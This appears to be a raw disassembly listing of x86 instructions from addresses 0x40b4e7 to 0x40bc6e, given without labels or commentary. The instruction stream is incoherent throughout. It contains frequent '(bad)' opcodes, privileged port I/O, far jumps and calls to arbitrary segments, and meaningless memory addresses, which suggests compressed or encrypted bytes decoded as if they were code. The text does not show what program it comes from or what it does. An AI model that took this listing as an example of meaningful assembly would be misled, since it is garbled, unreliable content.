  40b4e7:	outs   dx,BYTE PTR ds:[esi]
  40b4e8:	adc    al,0x14
  40b4ea:	retf   
  40b4eb:	call   0x75d1019d
  40b4f0:	outs   dx,BYTE PTR ds:[esi]
  40b4f1:	push   esp
  40b4f2:	xchg   esi,eax
  40b4f3:	or     al,0x13
  40b4f5:	ror    BYTE PTR [edx+0x6c],cl
  40b4f8:	imul   edx,esi,0xfffffff1
  40b4fb:	sub    BYTE PTR ds:0x5abca4fb,al
  40b501:	imul   edi,DWORD PTR [edx],0x6cc87f57
  40b507:	mov    bh,0xeb
  40b509:	loope  0x40b4f7
  40b50b:	stos   BYTE PTR es:[edi],al
  40b50c:	lahf   
  40b50d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b50e:	cld    
  40b50f:	inc    eax
  40b510:	daa    
  40b511:	lahf   
  40b512:	and    esp,esi
  40b514:	mov    cl,ah
  40b516:	xor    BYTE PTR [ebx],bh
  40b518:	adc    al,0x71
  40b51a:	xchg   edi,eax
  40b51b:	bound  esp,QWORD PTR [ecx]
  40b51d:	(bad)  
  40b51e:	push   esi
  40b51f:	in     al,dx
  40b520:	push   eax
  40b521:	out    0xfb,al
  40b523:	cld    
  40b524:	mov    ds:0xa4ad8d5,al
  40b529:	jmp    0x7f3f6328
  40b52e:	arpl   WORD PTR [eax+eiz*1+0x69],si
  40b532:	call   0xe131:0xc8105cd9
  40b539:	fist   DWORD PTR [edx+0x59]
  40b53c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b53d:	sub    eax,0x72c9351d
  40b542:	sahf   
  40b543:	lock in al,dx
  40b545:	(bad)  
  40b546:	push   edi
  40b547:	cmp    DWORD PTR [edx-0x4d],0x7a
  40b54b:	jge    0x40b5c3
  40b54d:	dec    esi
  40b54e:	(bad)  
  40b54f:	jb     0x40b5bd
  40b551:	sbb    DWORD PTR [edx-0x674285f7],esp
  40b557:	mov    edx,DWORD PTR [eax-0x21b83e1d]
  40b55d:	repnz sbb al,0x87
  40b560:	jle    0x40b59b
  40b562:	dec    esp
  40b563:	xchg   DWORD PTR [edx],esp
  40b565:	sub    BYTE PTR [edx+eax*2+0x6613f95c],al
  40b56c:	add    BYTE PTR [edx],dl
  40b56e:	mov    al,ds:0x26a1bcbf
  40b573:	xchg   ebp,eax
  40b574:	cli    
  40b575:	out    dx,eax
  40b576:	test   al,0x9c
  40b578:	add    bl,ah
  40b57a:	pop    ecx
  40b57b:	fidiv  WORD PTR [esi-0x49]
  40b57e:	div    BYTE PTR [edi-0x78]
  40b581:	mov    eax,ds:0x30e4c019
  40b586:	lods   eax,DWORD PTR ds:[esi]
  40b587:	and    eax,0x75a40681
  40b58c:	or     BYTE PTR [esi+0x6c],bl
  40b58f:	sbb    al,0x51
  40b591:	test   BYTE PTR [edx-0x1b8ce4d9],al
  40b597:	sub    ch,dh
  40b599:	daa    
  40b59a:	xchg   BYTE PTR [edx-0x3684114a],cl
  40b5a0:	push   ss
  40b5a1:	push   edx
  40b5a2:	xchg   esi,eax
  40b5a3:	jmp    0x9c9e:0xd994b3e6
  40b5aa:	mov    ?,ebp
  40b5ac:	pop    esi
  40b5ad:	leave  
  40b5ae:	jb     0x40b5ab
  40b5b0:	or     al,0xb5
  40b5b2:	add    DWORD PTR [edi-0x25],0xffffffc8
  40b5b6:	fdiv   DWORD PTR [esi-0x7f]
  40b5b9:	xchg   esp,eax
  40b5ba:	(bad)  [ebp+esi*1+0x66]
  40b5be:	xlat   BYTE PTR ds:[ebx]
  40b5bf:	je     0x40b548
  40b5c1:	adc    edi,esp
  40b5c3:	jnp    0x40b5a5
  40b5c5:	fnstcw WORD PTR [eax-0x7f]
  40b5c8:	push   cs
  40b5c9:	div    DWORD PTR [eax+0xa70b3d1]
  40b5cf:	nop
  40b5d0:	jo     0x40b618
  40b5d2:	js     0x40b606
  40b5d4:	(bad)  
  40b5d5:	adc    DWORD PTR [eax],esp
  40b5d7:	ds test eax,0x386acca4
  40b5dd:	and    al,BYTE PTR [edi-0x7f00e669]
  40b5e3:	dec    ebx
  40b5e4:	nop
  40b5e5:	mov    ecx,?
  40b5e7:	cmp    bl,BYTE PTR [ecx-0x71]
  40b5ea:	pushf  
  40b5eb:	pop    edi
  40b5ec:	push   cs
  40b5ed:	nop
  40b5ee:	mov    dl,0x41
  40b5f0:	nop
  40b5f1:	and    eax,DWORD PTR [ebx-0x3a]
  40b5f4:	xor    dl,dl
  40b5f6:	loopne 0x40b60a
  40b5f8:	and    cl,BYTE PTR [esi-0x19]
  40b5fb:	push   ss
  40b5fc:	out    dx,eax
  40b5fd:	gs inc eax
  40b5ff:	cdq    
  40b600:	jge    0x40b620
  40b602:	cmp    BYTE PTR [eax],al
  40b604:	std    
  40b605:	pop    esi
  40b606:	sahf   
  40b607:	jnp    0x40b602
  40b609:	or     eax,0xf4b1db1b
  40b60e:	sub    DWORD PTR [esi+esi*4+0x53107e29],esi
  40b615:	lods   al,BYTE PTR ds:[esi]
  40b616:	add    ebp,DWORD PTR [ecx+0x737ca040]
  40b61c:	nop
  40b61d:	lods   al,BYTE PTR ds:[esi]
  40b61e:	leave  
  40b61f:	repz adc BYTE PTR [eax+0x3769aa0f],al
  40b626:	fist   WORD PTR [edi+0xc]
  40b629:	pop    esi
  40b62a:	scas   al,BYTE PTR es:[edi]
  40b62b:	cmp    eax,0x3daa707a
  40b630:	jp     0x40b62b
  40b632:	arpl   WORD PTR [ecx],si
  40b634:	pop    esi
  40b635:	ja     0x40b687
  40b637:	imul   ecx,edi,0x7
  40b63a:	xor    ch,BYTE PTR [esi]
  40b63c:	fidivr DWORD PTR [edi+0x79]
  40b63f:	and    ah,dh
  40b641:	dec    ebp
  40b642:	xchg   esi,eax
  40b643:	push   esp
  40b644:	sbb    DWORD PTR [esi],edx
  40b646:	adc    ebx,DWORD PTR [ebx+ebp*8]
  40b649:	xor    eax,0x51a839e7
  40b64e:	into   
  40b64f:	js     0x40b5d2
  40b651:	ins    BYTE PTR es:[edi],dx
  40b652:	jo     0x40b6c7
  40b654:	dec    ebp
  40b655:	or     edi,ecx
  40b657:	shl    DWORD PTR [esi],1
  40b659:	and    DWORD PTR [esi+0x4a1c238a],esi
  40b65f:	or     cl,BYTE PTR [edi-0x56d25970]
  40b665:	mov    ds:0x32064f81,al
  40b66a:	mov    dl,0xd6
  40b66c:	fld    TBYTE PTR [ebx]
  40b66e:	push   cs
  40b66f:	push   ebp
  40b670:	(bad)  [ecx+eax*1-0x6d3d1f1]
  40b677:	loop   0x40b605
  40b679:	adc    dh,BYTE PTR [ebp+0xc]
  40b67c:	lock imul esp,DWORD PTR ds:0xde463a60,0x4c
  40b684:	test   BYTE PTR [edx],cl
  40b686:	sahf   
  40b687:	imul   DWORD PTR [eax]
  40b689:	dec    ecx
  40b68a:	inc    esi
  40b68b:	fcmovbe st,st(6)
  40b68d:	popf   
  40b68e:	or     eax,0x13adc664
  40b693:	jmp    0x40b683
  40b695:	in     al,dx
  40b696:	xor    al,0x32
  40b698:	mov    ebx,0xfb2a0f92
  40b69d:	dec    edx
  40b69e:	jbe    0x40b71c
  40b6a0:	inc    eax
  40b6a1:	outs   dx,BYTE PTR ds:[esi]
  40b6a2:	xlat   BYTE PTR ds:[ebx]
  40b6a3:	adc    eax,eax
  40b6a5:	(bad)  
  40b6a6:	jge    0x40b6c9
  40b6a8:	cmp    eax,0xf903cf07
  40b6ad:	ins    BYTE PTR es:[edi],dx
  40b6ae:	sub    esi,esi
  40b6b0:	mov    eax,ds:0x5ecb1c25
  40b6b5:	cli    
  40b6b6:	or     dh,BYTE PTR [edi]
  40b6b8:	aad    0xe
  40b6ba:	jge    0x40b6f4
  40b6bc:	xor    BYTE PTR ds:[ebx-0x50b790cc],0x6c
  40b6c4:	lahf   
  40b6c5:	dec    edi
  40b6c6:	scas   eax,DWORD PTR es:[edi]
  40b6c7:	jg     0x40b661
  40b6c9:	or     BYTE PTR [esi],dh
  40b6cb:	neg    DWORD PTR [edi-0x262b936b]
  40b6d1:	dec    eax
  40b6d2:	cmp    bh,cl
  40b6d4:	pushf  
  40b6d5:	mov    bh,0x44
  40b6d7:	add    DWORD PTR [ecx-0x14efdb12],0x72244c53
  40b6e1:	xlat   BYTE PTR ds:[ebx]
  40b6e2:	sub    al,0xc
  40b6e4:	cwde   
  40b6e5:	iret   
  40b6e6:	shl    DWORD PTR [edi],1
  40b6e8:	cdq    
  40b6e9:	xchg   BYTE PTR [ebx-0x60],ch
  40b6ec:	xor    DWORD PTR [eax-0x4f490327],eax
  40b6f2:	cmp    al,0xdd
  40b6f4:	fidivr WORD PTR ds:0xe8e1c603
  40b6fa:	ret    0xccff
  40b6fd:	dec    ecx
  40b6fe:	ror    DWORD PTR [eax-0x64],1
  40b701:	fmul   QWORD PTR [ebp+0x24]
  40b704:	fcmovb st,st(3)
  40b706:	xor    al,0x63
  40b708:	and    eax,edi
  40b70a:	loop   0x40b6f3
  40b70c:	mov    al,0xb5
  40b70e:	jmp    0xa9e0:0x80a6a71e
  40b715:	mov    ebp,0xdcffa24e
  40b71a:	push   ebx
  40b71b:	int    0xb7
  40b71d:	jle    0x40b72e
  40b71f:	mov    al,0xb1
  40b721:	jno    0x40b769
  40b723:	push   esp
  40b724:	pop    ecx
  40b725:	inc    edi
  40b726:	jle    0x40b73f
  40b728:	add    cl,dh
  40b72a:	rcr    DWORD PTR [eax+edx*4-0x405e1dcc],cl
  40b731:	xchg   esp,eax
  40b732:	jne    0x40b74b
  40b734:	repz js 0x40b72f
  40b737:	lahf   
  40b738:	mov    ch,0x40
  40b73a:	mov    al,ds:0x110b6741
  40b73f:	or     al,0x54
  40b741:	add    edi,DWORD PTR [esi]
  40b743:	retf   
  40b744:	dec    edx
  40b745:	fwait
  40b746:	bnd jae 0x40b6fe
  40b749:	dec    esp
  40b74a:	jecxz  0x40b77a
  40b74c:	dec    eax
  40b74d:	cld    
  40b74e:	ss int3 
  40b750:	es cld 
  40b752:	iret   
  40b753:	nop
  40b754:	xchg   BYTE PTR [eax],bl
  40b756:	mov    ecx,0x4c1746e3
  40b75b:	iret   
  40b75c:	sbb    DWORD PTR [esi],0x7e
  40b75f:	xlat   BYTE PTR ds:[ebx]
  40b760:	mov    ecx,0xf9be207b
  40b765:	jne    0x40b790
  40b767:	es pop ss
  40b769:	bound  edx,QWORD PTR [ebx+eiz*2-0x9ae0649]
  40b770:	ds xchg esi,eax
  40b772:	mov    ds:0x50b2c790,al
  40b777:	push   ecx
  40b778:	xor    eax,edx
  40b77a:	out    0xc1,eax
  40b77c:	mov    eax,ds:0xb248bd98
  40b781:	pop    eax
  40b782:	or     esp,DWORD PTR [esi+0x62c4d3d3]
  40b788:	xor    ebx,esp
  40b78a:	mov    ebx,0x161356e2
  40b78f:	cmp    BYTE PTR [ebx+0x44],dh
  40b792:	sbb    eax,0x9a589404
  40b797:	mov    edi,0xe678d48
  40b79c:	push   esi
  40b79d:	pop    ecx
  40b79e:	add    eax,esp
  40b7a0:	adc    al,0xad
  40b7a2:	les    ebp,FWORD PTR [ebp+0x2174251d]
  40b7a8:	je     0x40b767
  40b7aa:	outs   dx,DWORD PTR ds:[si]
  40b7ac:	or     al,0xd2
  40b7ae:	je     0x40b7c4
  40b7b0:	jge    0x40b7f6
  40b7b2:	addr16 call 0x7d87c073
  40b7b8:	pop    eax
  40b7b9:	frstor [ecx-0x1ed5c992]
  40b7bf:	sbb    dh,al
  40b7c1:	cmp    DWORD PTR ds:[edx+0x51],eax
  40b7c5:	xchg   esi,eax
  40b7c6:	mov    ebp,DWORD PTR [eax]
  40b7c8:	(bad)  
  40b7c9:	mov    ebx,0x22f25ec9
  40b7ce:	imul   ecx,DWORD PTR [ecx],0x95949ad8
  40b7d4:	mov    ecx,0x1b28efc1
  40b7d9:	in     eax,dx
  40b7da:	dec    edx
  40b7db:	scas   al,BYTE PTR es:[edi]
  40b7dc:	addr16 into 
  40b7de:	in     eax,dx
  40b7df:	ret    
  40b7e0:	rol    BYTE PTR [edx],cl
  40b7e2:	pop    edx
  40b7e3:	cs jo  0x40b797
  40b7e6:	sbb    ebp,eax
  40b7e8:	jnp    0x40b787
  40b7ea:	jns    0x40b793
  40b7ec:	in     eax,dx
  40b7ed:	retf   0x1086
  40b7f0:	adc    BYTE PTR [ebp-0x7c],bl
  40b7f3:	jg     0x40b7c8
  40b7f5:	jb     0x40b7a8
  40b7f7:	add    ah,BYTE PTR [ebx+0x652565de]
  40b7fd:	inc    esi
  40b7fe:	push   edi
  40b7ff:	mov    dh,0xc9
  40b801:	push   0x3d
  40b803:	cmp    eax,0xf71bb692
  40b808:	push   esi
  40b809:	inc    esi
  40b80a:	movups XMMWORD PTR [edi+0x33915ace],xmm0
  40b811:	sbb    edi,esp
  40b813:	ror    BYTE PTR [ebx+0x30],cl
  40b816:	mov    cl,0x2c
  40b818:	and    BYTE PTR [edx+0x4248a323],ch
  40b81e:	add    ebp,DWORD PTR ds:0x1874405f
  40b824:	(bad)  
  40b825:	jg     0x40b856
  40b827:	aad    0x68
  40b829:	adc    ch,BYTE PTR [ebx]
  40b82b:	dec    esp
  40b82c:	push   cs
  40b82d:	outs   dx,DWORD PTR ds:[esi]
  40b82e:	mov    ebx,0x18ae03a5
  40b833:	fs pop ebp
  40b835:	lds    ebx,FWORD PTR [ebp-0x78]
  40b838:	xchg   edi,eax
  40b839:	les    ebp,FWORD PTR [ebx]
  40b83b:	push   0x686b1f4a
  40b840:	fld    TBYTE PTR [eax*2-0x604861b5]
  40b847:	fdivr  QWORD PTR [ebx+0x620f58e8]
  40b84d:	das    
  40b84e:	xchg   esp,eax
  40b84f:	in     al,0xa4
  40b851:	and    BYTE PTR [esi-0x2],0xe1
  40b855:	shl    BYTE PTR [edi],0xb7
  40b858:	call   0x20c97218
  40b85d:	jecxz  0x40b800
  40b85f:	fidivr DWORD PTR [esi+0x6f]
  40b862:	push   edx
  40b863:	lds    eax,FWORD PTR [edi-0x7067666e]
  40b869:	aad    0x32
  40b86b:	jge    0x40b7f7
  40b86d:	ret    
  40b86e:	inc    edx
  40b86f:	and    eax,0x4305e4e6
  40b874:	pop    edx
  40b875:	xchg   ebx,eax
  40b876:	out    dx,al
  40b877:	mov    ds:0x7e18445d,eax
  40b87c:	mov    ds:0x100289f8,eax
  40b881:	aad    0xc8
  40b883:	push   ds
  40b884:	inc    esp
  40b885:	scas   eax,DWORD PTR es:[edi]
  40b886:	jae    0x40b895
  40b888:	(bad)  
  40b889:	pop    ecx
  40b88a:	loop   0x40b8f6
  40b88c:	pop    esi
  40b88d:	push   ebp
  40b88e:	adc    eax,0xfa51e410
  40b893:	add    cl,BYTE PTR [ebx]
  40b895:	gs inc ecx
  40b897:	stos   BYTE PTR es:[edi],al
  40b898:	arpl   WORD PTR [ecx-0x24],si
  40b89b:	add    dh,dl
  40b89d:	sti    
  40b89e:	or     BYTE PTR [ebx-0x54],al
  40b8a1:	je     0x40b870
  40b8a3:	stc    
  40b8a4:	sub    dh,BYTE PTR [eax-0x3a]
  40b8a7:	sub    esi,DWORD PTR [edi+0x58908396]
  40b8ad:	pop    ebx
  40b8ae:	jno    0x40b855
  40b8b0:	pusha  
  40b8b1:	add    al,0x8a
  40b8b3:	bound  ebx,QWORD PTR [edx+0x4749050b]
  40b8b9:	adc    BYTE PTR [esp+edx*8+0x17e20ff0],ch
  40b8c0:	xchg   edx,eax
  40b8c1:	call   0xab7448e3
  40b8c6:	test   eax,0x815c1294
  40b8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8cc:	test   BYTE PTR [eax-0xdca1ba],ch
  40b8d2:	fistp  QWORD PTR [edx+0xa]
  40b8d5:	iret   
  40b8d6:	adc    dl,ch
  40b8d8:	aad    0xb7
  40b8da:	mov    ds:0xe4c60d2f,al
  40b8df:	es jne 0x40b89e
  40b8e2:	rcl    BYTE PTR [edx],1
  40b8e4:	jecxz  0x40b90f
  40b8e6:	jl     0x40b8b1
  40b8e8:	adc    ebx,esp
  40b8ea:	push   eax
  40b8eb:	lock jno 0x40b8e1
  40b8ee:	push   ecx
  40b8ef:	sbb    al,0x1b
  40b8f1:	icebp  
  40b8f2:	push   ebp
  40b8f3:	jno    0x40b8c8
  40b8f5:	test   DWORD PTR [ecx-0x5a5e3a5b],ebx
  40b8fb:	scas   al,BYTE PTR es:[edi]
  40b8fc:	dec    eax
  40b8fd:	push   0xc2c7d2a9
  40b902:	int3   
  40b903:	icebp  
  40b904:	cdq    
  40b905:	stos   BYTE PTR es:[edi],al
  40b906:	inc    ecx
  40b907:	jmp    0xe933fd36
  40b90c:	fst    QWORD PTR [ebx]
  40b90e:	dec    BYTE PTR [ebx+0x4bbcd972]
  40b914:	test   BYTE PTR fs:[edx+edi*2+0x15c0e578],bl
  40b91c:	scas   al,BYTE PTR es:[edi]
  40b91d:	lods   al,BYTE PTR ds:[esi]
  40b91e:	xchg   esi,eax
  40b91f:	xor    BYTE PTR [ecx-0x17],dl
  40b922:	in     eax,0xda
  40b924:	call   0x4f3ca1be
  40b929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b92a:	xor    eax,0xa48a4d2f
  40b92f:	mov    BYTE PTR [eax+0x3a010a70],dh
  40b935:	bound  ebx,QWORD PTR [ecx+esi*1+0x1b]
  40b939:	cmp    eax,0x3fd26995
  40b93e:	neg    DWORD PTR es:0xede6d8b1
  40b945:	fidivr WORD PTR [esp+edx*2-0x76e3088a]
  40b94c:	cwde   
  40b94d:	sub    DWORD PTR [eax],edx
  40b94f:	inc    ecx
  40b950:	stos   DWORD PTR es:[edi],eax
  40b951:	aad    0x59
  40b953:	push   esp
  40b954:	and    DWORD PTR [edi],edx
  40b956:	fdivr  QWORD PTR [edi-0x1a]
  40b959:	push   eax
  40b95a:	sub    BYTE PTR [ebx],0x8b
  40b95d:	xor    bl,BYTE PTR [ecx-0x21b70f3b]
  40b963:	call   0xfdf6:0x314f9e03
  40b96a:	mov    dl,0x6
  40b96c:	ret    
  40b96d:	test   al,0xc1
  40b96f:	fidiv  WORD PTR [edi+ebx*8-0x78ef08a1]
  40b976:	pop    esp
  40b977:	(bad)  
  40b978:	out    0x4b,eax
  40b97a:	jne    0x40b9bf
  40b97c:	jae    0x40b909
  40b97e:	arpl   WORD PTR [ebx+0x18],sp
  40b981:	aas    
  40b982:	sub    al,0x10
  40b984:	std    
  40b985:	call   0x70bf0b30
  40b98a:	(bad)  
  40b98b:	(bad)  
  40b98c:	shl    DWORD PTR [ebx-0x3e],cl
  40b98f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b990:	adc    al,0x21
  40b992:	dec    esp
  40b993:	ins    BYTE PTR es:[edi],dx
  40b994:	mov    ecx,0xd3e218fc
  40b999:	test   DWORD PTR [ebp+eiz*2+0x6436f54a],ebp
  40b9a0:	dec    DWORD PTR [eax]
  40b9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a3:	arpl   WORD PTR [ecx+0x55d7b51e],sp
  40b9a9:	cmp    dl,BYTE PTR [ebp-0x6abc0037]
  40b9af:	inc    ecx
  40b9b0:	push   edi
  40b9b1:	push   edx
  40b9b2:	inc    esp
  40b9b3:	cmp    bh,BYTE PTR [bx+di-0x3f]
  40b9b7:	push   cs
  40b9b8:	cs jae 0x40b947
  40b9bb:	adc    BYTE PTR [eax+0x74],bl
  40b9be:	add    ecx,DWORD PTR [edi+0x1b]
  40b9c1:	mov    eax,ss:0xbcf10085
  40b9c7:	fldcw  WORD PTR [edi-0x68fd20d6]
  40b9cd:	(bad)
  40b9d0:	lea    ebp,[eax]
  40b9d2:	sub    eax,0x1fc487e0
  40b9d7:	popa   
  40b9d8:	mov    BYTE PTR [edx],0x1c
  40b9db:	out    0x33,al
  40b9dd:	cmc    
  40b9de:	xchg   bh,ah
  40b9e0:	xor    dl,al
  40b9e2:	es push ecx
  40b9e4:	adc    dh,BYTE PTR [ecx+edi*2]
  40b9e7:	retf   
  40b9e8:	(bad)  
  40b9e9:	ins    DWORD PTR es:[edi],dx
  40b9ea:	jmp    0xe44d:0x951e3001
  40b9f1:	ftst   
  40b9f3:	dec    eax
  40b9f4:	xchg   esp,eax
  40b9f5:	push   ebx
  40b9f6:	dec    ecx
  40b9f7:	not    DWORD PTR [esp+edi*4]
  40b9fa:	or     DWORD PTR [esi],esi
  40b9fc:	loopne 0x40b98a
  40b9fe:	push   esi
  40b9ff:	test   BYTE PTR [edx-0x4e],0xdd
  40ba03:	cld    
  40ba04:	sub    eax,0x99c2161
  40ba09:	pop    DWORD PTR [ebx+0x38]
  40ba0c:	jno    0x40b9e8
  40ba0e:	repz gs test eax,0x66ad0094
  40ba15:	mov    esi,0xa32d1c90
  40ba1a:	ret    0xf132
  40ba1d:	in     al,0x21
  40ba1f:	fadd   st(6),st
  40ba21:	pop    ebp
  40ba22:	pushf  
  40ba23:	or     eax,0x3175350d
  40ba28:	syscall 
  40ba2a:	repnz mov edi,0x66168e61
  40ba30:	adc    DWORD PTR [ebx+0x1b],0xffffff9a
  40ba34:	adc    dh,dl
  40ba36:	inc    ebx
  40ba37:	add    ah,BYTE PTR [ebx-0x12]
  40ba3a:	xchg   ecx,eax
  40ba3b:	mov    al,0x92
  40ba3d:	(bad)  
  40ba3e:	jge    0x40b9c7
  40ba40:	in     al,0x5
  40ba42:	mov    bh,BYTE PTR [esi-0x60db9a2]
  40ba48:	dec    edx
  40ba49:	int3   
  40ba4a:	xchg   esi,eax
  40ba4b:	sar    BYTE PTR [edx+0x2ddf8fb6],0x9d
  40ba52:	sbb    ch,BYTE PTR [ebp+0x5d]
  40ba55:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40ba57:	lds    ebp,FWORD PTR [esi]
  40ba59:	push   cx
  40ba5b:	ret    0xb054
  40ba5e:	lea    edx,ds:0xeafa006
  40ba64:	aad    0x80
  40ba66:	ds dec eax
  40ba68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba69:	xchg   DWORD PTR [edx-0x34],ebp
  40ba6c:	(bad)  
  40ba6d:	jnp    0x40ba61
  40ba6f:	add    dh,BYTE PTR [ecx+esi*4]
  40ba72:	fsub   QWORD PTR [esi-0x34]
  40ba75:	mov    eax,ds:0xbdae00a2
  40ba7a:	or     esp,DWORD PTR [esi+0x145f91b8]
  40ba80:	in     al,0x38
  40ba82:	es push cs
  40ba84:	and    DWORD PTR ds:0x3ff8cb3e,ebp
  40ba8a:	pop    es
  40ba8b:	cmp    BYTE PTR [ecx-0xff65e57],0x92
  40ba92:	test   BYTE PTR [ebx],dl
  40ba94:	fisub  WORD PTR [esi+ebp*4+0x34813e75]
  40ba9b:	arpl   WORD PTR [esi-0x3],sp
  40ba9e:	mov    al,ds:0xca99f385
  40baa3:	imul   edx,DWORD PTR [ecx+0x26b8c25e],0x2d
  40baaa:	xchg   edi,eax
  40baab:	push   ss
  40baac:	fcmove st,st(3)
  40baae:	mov    edx,0x1c0ed201
  40bab3:	xchg   BYTE PTR [ecx],cl
  40bab5:	fistp  WORD PTR [edx+edx*8+0xc]
  40bab9:	jg     0x40ba7a
  40babb:	shl    BYTE PTR [edx-0x29d5e50d],0x7a
  40bac2:	mov    esi,0x4c0486b4
  40bac7:	jmp    0xa55f:0xbc723868
  40bace:	aam    0x0
  40bad0:	in     eax,0x3e
  40bad2:	scas   al,BYTE PTR es:[edi]
  40bad3:	(bad)  
  40bad4:	pop    ecx
  40bad5:	mov    bh,BYTE PTR [ebp+0x6ef3e5e0]
  40badb:	jb     0x40ba71
  40badd:	jno    0x40bae1
  40badf:	add    al,0xd7
  40bae1:	mov    ds:0x78b6f115,al
  40bae6:	cmc    
  40bae7:	sbb    eax,0xdcbf7c32
  40baec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baed:	inc    esi
  40baee:	fstp   TBYTE PTR [ebp-0x73]
  40baf1:	or     eax,0xbcbfa4d3
  40baf6:	jne    0x40ba92
  40baf8:	scas   al,BYTE PTR es:[edi]
  40baf9:	mov    bl,0xdf
  40bafb:	sahf   
  40bafc:	ss call 0xcb74:0x2c28ee3b
  40bb04:	cs das 
  40bb06:	je     0x40bb61
  40bb08:	mov    ds:0x643b73dd,eax
  40bb0d:	leave  
  40bb0e:	sub    BYTE PTR [eax-0x391873af],0xe2
  40bb15:	jg     0x40bb27
  40bb17:	in     eax,0x62
  40bb19:	int    0xb5
  40bb1b:	mov    BYTE PTR [ebx+0x27607b90],ah
  40bb21:	fnstsw WORD PTR [ebp-0x35]
  40bb24:	mov    al,ds:0x7008c621
  40bb29:	push   ds
  40bb2a:	les    ebp,FWORD PTR [ebx+0x4ee44e15]
  40bb30:	mov    ebx,0x4e48d88f
  40bb35:	mov    ebx,0xfe2d0342
  40bb3a:	or     ah,bh
  40bb3c:	cli    
  40bb3d:	loope  0x40bb41
  40bb3f:	dec    esi
  40bb40:	add    al,BYTE PTR [ebp+0x13d4e31]
  40bb46:	addr16 clc 
  40bb48:	dec    esi
  40bb49:	mov    es,WORD PTR [ebp-0x1e]
  40bb4c:	xor    DWORD PTR [esi+0x6d88111e],0x1c74136d
  40bb56:	inc    edi
  40bb57:	test   DWORD PTR [esi+0x3d7e4ac1],ebp
  40bb5d:	sbb    bh,bh
  40bb5f:	or     al,BYTE PTR [edi+edi*1]
  40bb62:	inc    ebp
  40bb63:	push   cs
  40bb64:	add    ah,BYTE PTR [ebp+edx*8-0x5fd249b8]
  40bb6b:	das    
  40bb6c:	jnp    0x40bbac
  40bb6e:	out    dx,eax
  40bb6f:	dec    esi
  40bb70:	cmp    edx,DWORD PTR [edx]
  40bb72:	mov    edi,0xd00ffe01
  40bb77:	daa    
  40bb78:	xchg   esi,eax
  40bb79:	call   0x246acda9
  40bb7e:	inc    ebp
  40bb7f:	js     0x40bbf1
  40bb81:	push   edi
  40bb82:	pop    ecx
  40bb83:	jne    0x40bbf5
  40bb85:	dec    esi
  40bb86:	push   ss
  40bb87:	icebp  
  40bb88:	dec    edi
  40bb89:	push   esi
  40bb8a:	pop    ss
  40bb8b:	jbe    0x40bb55
  40bb8d:	push   ss
  40bb8e:	in     al,dx
  40bb8f:	mov    edx,0xeac44b29
  40bb94:	ss in  al,0x9c
  40bb97:	mov    al,0x1e
  40bb99:	retf   0xb046
  40bb9c:	ins    BYTE PTR es:[edi],dx
  40bb9d:	inc    eax
  40bb9e:	test   BYTE PTR [ebx-0x55c39c00],cl
  40bba4:	mov    ecx,0x5801a90b
  40bba9:	xlat   BYTE PTR ds:[ebx]
  40bbaa:	lods   eax,DWORD PTR ds:[esi]
  40bbab:	cmp    eax,0x81fd14c
  40bbb0:	mov    esp,0x72f5e84
  40bbb5:	les    eax,FWORD PTR [edi+0x3]
  40bbb8:	mov    cs,edx
  40bbba:	mov    ebp,0xa1cd9e42
  40bbbf:	mov    ah,0x34
  40bbc1:	rol    DWORD PTR [ebp+0x55],cl
  40bbc4:	clc    
  40bbc5:	xchg   ah,cl
  40bbc7:	mov    edx,0xe5b6d744
  40bbcc:	loopne 0x40bb55
  40bbce:	sub    DWORD PTR [eax-0x70],esp
  40bbd1:	or     eax,0x5a5e389d
  40bbd6:	dec    eax
  40bbd7:	jae    0x40bbc4
  40bbd9:	sub    ebp,DWORD PTR [edx-0x2706372]
  40bbdf:	call   0x326e2221
  40bbe4:	jg     0x40bc11
  40bbe6:	into   
  40bbe7:	call   0x7571:0xbb41fe50
  40bbee:	popa   
  40bbef:	cdq    
  40bbf0:	in     eax,0x4
  40bbf2:	xlat   BYTE PTR ds:[ebx]
  40bbf3:	jge    0x40bb8d
  40bbf5:	aas    
  40bbf6:	ret    
  40bbf7:	dec    ebp
  40bbf8:	loope  0x40bc64
  40bbfa:	fidivr WORD PTR [edx]
  40bbfc:	push   cs
  40bbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbfe:	js     0x40bc33
  40bc00:	bnd jne 0x40bb9b
  40bc03:	fild   DWORD PTR [edx]
  40bc05:	dec    edi
  40bc06:	lea    edx,ds:[ecx]
  40bc09:	sub    edi,esp
  40bc0b:	mov    DWORD PTR [ebx],ebx
  40bc0d:	xchg   esp,eax
  40bc0e:	jb     0x40bbe0
  40bc10:	ror    DWORD PTR [ecx],1
  40bc12:	cmp    al,0xb3
  40bc14:	xchg   esp,eax
  40bc15:	and    DWORD PTR [edi-0xfd25102],eax
  40bc1b:	lods   eax,DWORD PTR ds:[esi]
  40bc1c:	ja     0x40bc43
  40bc1e:	mov    cs,WORD PTR [eax]
  40bc20:	jns    0x40bc40
  40bc22:	inc    edx
  40bc23:	mov    esp,0x48c365bf
  40bc28:	push   ss
  40bc29:	mov    cl,0xd6
  40bc2b:	mov    ebx,0x2a6496a
  40bc30:	daa    
  40bc31:	fist   WORD PTR [ebx]
  40bc33:	cmp    BYTE PTR [esi+0x70e2b0d],bl
  40bc39:	cwde   
  40bc3a:	loopne 0x40bc44
  40bc3c:	nop
  40bc3d:	pop    ds
  40bc3e:	out    0xa4,al
  40bc40:	pop    es
  40bc41:	or     BYTE PTR [esi-0x67],dh
  40bc44:	sbb    eax,DWORD PTR [edi+0x29f97e6c]
  40bc4a:	inc    esi
  40bc4b:	fimul  WORD PTR [edi-0x2a765388]
  40bc51:	push   ebx
  40bc52:	push   cs
  40bc53:	retf   
  40bc54:	imul   eax,DWORD PTR [esi+0x2ed2e4ed],0x6ac4cec9
  40bc5e:	sbb    dh,al
  40bc60:	or     dl,dh
  40bc62:	xchg   ecx,eax
  40bc63:	imul   DWORD PTR [ebp+edx*2+0x2ad0467e]
  40bc6a:	in     eax,dx
  40bc6b:	mov    ebx,edx
  40bc6d:	(bad)  
  40bc6e:	jmp    0x2948b0a0
